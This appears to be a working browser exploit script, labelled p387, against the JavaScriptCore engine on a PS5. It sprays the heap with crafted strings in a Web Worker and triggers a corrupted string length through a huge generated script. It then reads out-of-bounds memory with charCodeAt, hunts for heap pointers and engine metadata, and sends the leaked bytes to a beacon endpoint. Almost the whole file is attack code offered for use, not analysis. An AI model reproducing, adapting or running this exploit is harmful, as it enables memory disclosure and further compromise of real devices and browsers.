// p387 - OOB charCodeAt via m_length corruption + shorter StringImpl
//
// V383/V384 PROVED: Worker JSString::m_length corrupted to bytecodeIndex (~79600).
// V385/V386: Main-thread and Worker small objects NOT in sweep path.
// V383/V384: 100000-char Worker strings WITH bait-and-switch DO get m_length corruption.
//
// KEY INSIGHT: ASSERT_WITH_SECURITY_IMPLICATION stripped on PS5.
// StringImpl::operator[] has NO bounds check in release.
// If JSString::m_length (corrupted to ~79600) > StringImpl actual length (50000),
// charCodeAt(50001..79599) reads OOB past StringImpl buffer into adjacent IsoHeap memory.
//
// APPROACH:
//   - Bait strings: 20 x 100000 chars (same as V383, to match heap layout)
//   - Probe strings: 10 x 50000 chars (SHORTER, so m_length > actual = OOB)
//   - If m_length ~79600 > 50000: ~29600 bytes of OOB read
//
// Beacon prefix: V387-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V387-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V387-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var workerCode = function() {
    var probes = [];
    var baseUrl = '';
    var BAIT_LEN = 100000;
    var PROBE_LEN = 50000;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V387-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    function readU32LE(str, off) {
      try {
        return (str.charCodeAt(off) | (str.charCodeAt(off+1) << 8) |
                (str.charCodeAt(off+2) << 16) | ((str.charCodeAt(off+3) << 24) >>> 0)) >>> 0;
      } catch(e) { return 0xDEADDEAD; }
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'alloc') {
        // Bait strings: 100000 chars (same as V383 to match heap layout)
        var baits = [];
        for (var i = 0; i < 20; i++) {
          var b = '';
          for (var j = 0; j < 100; j++) b += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
          b = b.substring(0, BAIT_LEN);
          b.charCodeAt(0);
          baits.push(b);
        }
        beacon('BAIT-' + baits.length);

        // Probe strings: 50000 chars (SHORTER - so m_length > actual = OOB)
        for (var i = 0; i < 10; i++) {
          var p = '';
          for (var j = 0; j < 50; j++) p += 'PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP';
          p = p.substring(0, PROBE_LEN);
          p.charCodeAt(0);
          probes.push(p);
        }
        beacon('PROBES-' + probes.length);

        // Free baits (same as V383)
        for (var i = 0; i < baits.length; i++) baits[i] = null;
        baits = null;
        beacon('FREED');
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');
        var oobCount = 0;
        var truncCount = 0;

        for (var i = 0; i < probes.length; i++) {
          try {
            var p = probes[i];
            var len = p.length;

            if (len === PROBE_LEN) {
              beacon('P' + i + '-INTACT-' + len);
              continue;
            }

            beacon('P' + i + '-LEN-' + len);

            if (len > PROBE_LEN) {
              // OOB READ AVAILABLE!
              oobCount++;
              var oobBytes = len - PROBE_LEN;
              beacon('P' + i + '-OOB-' + oobBytes + 'B');

              // Verify in-bounds data is still 'P'
              var inOk = true;
              for (var j = PROBE_LEN - 10; j < PROBE_LEN; j++) {
                if (p.charCodeAt(j) !== 0x50) { inOk = false; break; }
              }
              beacon('P' + i + '-INBOUND-' + (inOk ? 'OK' : 'CORRUPT'));

              // Read OOB data - first 256 bytes
              var scanEnd = Math.min(len, PROBE_LEN + 256);
              var hex = '';
              for (var j = PROBE_LEN; j < scanEnd; j++) {
                try {
                  var c = p.charCodeAt(j);
                  if (c !== c) { hex += 'XX'; break; }
                  hex += hexByte(c);
                } catch(ex) { hex += 'XX'; break; }
              }
              // Send in chunks
              for (var off = 0; off < hex.length; off += 60) {
                beacon('P' + i + '-D' + (PROBE_LEN + off/2) + '-' + hex.substring(off, off + 60));
              }

              // Look for pointer-like values (8 bytes with high bits set)
              for (var j = PROBE_LEN; j + 8 <= Math.min(len, PROBE_LEN + 1024); j += 8) {
                try {
                  var lo = readU32LE(p, j);
                  var hi = readU32LE(p, j + 4);
                  // Check for plausible heap pointer (0x00007f... or 0x000000...)
                  if (hi >= 0x7F00 && hi <= 0x7FFF) {
                    beacon('P' + i + '-PTR-' + j + '-' + hexByte(hi>>8) + hexByte(hi&0xFF) + hexByte((lo>>24)&0xFF) + hexByte((lo>>16)&0xFF) + hexByte((lo>>8)&0xFF) + hexByte(lo&0xFF));
                  }
                  // Also check for StructureID-like (low uint32, 1-10000)
                  if (lo >= 1 && lo <= 10000 && (hi & 0xFF000000) <= 0x03000000) {
                    beacon('P' + i + '-SID-' + j + '-id' + lo);
                  }
                } catch(ex) { break; }
              }

              // Scan deeper at 112-byte stride for metadata entry pattern
              for (var j = PROBE_LEN; j + 112 <= Math.min(len, PROBE_LEN + 4096); j += 112) {
                try {
                  var v12 = readU32LE(p, j + 12);
                  if (v12 === 0xFFFFFFFF) {
                    beacon('P' + i + '-ENTRY-' + j);
                    // Thunk at +24
                    var tlo = readU32LE(p, j + 24);
                    var thi = readU32LE(p, j + 28);
                    beacon('P' + i + '-THUNK-' + hexByte(thi>>8) + hexByte(thi&0xFF) + hexByte((tlo>>24)&0xFF) + hexByte((tlo>>16)&0xFF) + hexByte((tlo>>8)&0xFF) + hexByte(tlo&0xFF));
                    // bytecodeIndex at +68
                    var bci = readU32LE(p, j + 68);
                    beacon('P' + i + '-BCI-' + bci);
                    break;
                  }
                } catch(ex) { break; }
              }

            } else {
              // m_length < original (truncated, like V383/V384)
              truncCount++;
              beacon('P' + i + '-TRUNC-' + len + '-from' + PROBE_LEN);
            }
          } catch(ex) {
            beacon('P' + i + '-ERR-' + (ex.message || '').substring(0, 25));
          }
        }

        beacon('OOB-' + oobCount + '-TRUNC-' + truncCount);
        beacon('ALL-DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(['(' + workerCode.toString() + ')()'], { type: 'application/javascript' });
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: location.protocol + '//' + location.host });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) {
      B('WORKER-SCAN-DONE');
    }
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p387fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p387ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p387ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
